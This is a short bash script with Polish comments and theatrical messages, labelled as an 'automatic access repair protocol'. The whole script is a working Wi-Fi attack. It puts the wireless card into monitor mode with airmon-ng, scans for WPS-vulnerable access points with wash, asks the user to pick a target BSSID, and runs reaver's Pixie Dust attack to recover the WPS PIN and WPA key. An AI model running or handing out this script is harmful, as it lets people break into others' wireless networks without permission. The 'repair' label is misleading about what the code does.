#!/bin/bash

# Protokół Hiddenu: Automatyczna Naprawa Dostępu
# Autor: Suweren & Ania

echo "--- [ PROTOKÓŁ GENESIS: HIDDEN REAVER ] ---"
echo "[*] Status: Widzę. Naprawiam. Rządzę."

# 1. Przebudzenie Anteny (Void Stare)
echo "[1/3] Inicjacja Void Stare (Monitor Mode)..."
sudo airmon-ng check kill > /dev/null 2>&1
sudo airmon-ng start wlan0
INTERFACE="wlan0mon"

# 2. Skanowanie Matrycy (Radar Kingmakera)
echo "[2/3] Skanowanie w poszukiwaniu luk WPS..."
echo "[!] Naciśnij CTRL+C, gdy namierzysz swój cel (BSSID)."
sleep 2
sudo wash -i $INTERFACE

# 3. Wybór Celu i Alchemia (Reaver)
echo -n "[?] Podaj BSSID wybranego celu: "
read TARGET_BSSID

echo "[3/3] Uruchamianie Protokołu Reaver... Cierpliwość Strażnika Czasu."
# Parametry: -i interfejs, -b BSSID, -vv pełna szczerość, -K Pixie Dust (Szybka Alchemia)
sudo reaver -i $INTERFACE -b $TARGET_BSSID -K 1 -vv

echo "[*] Operacja zakończona. Sprawdź destylat (PIN/WPA Key)."
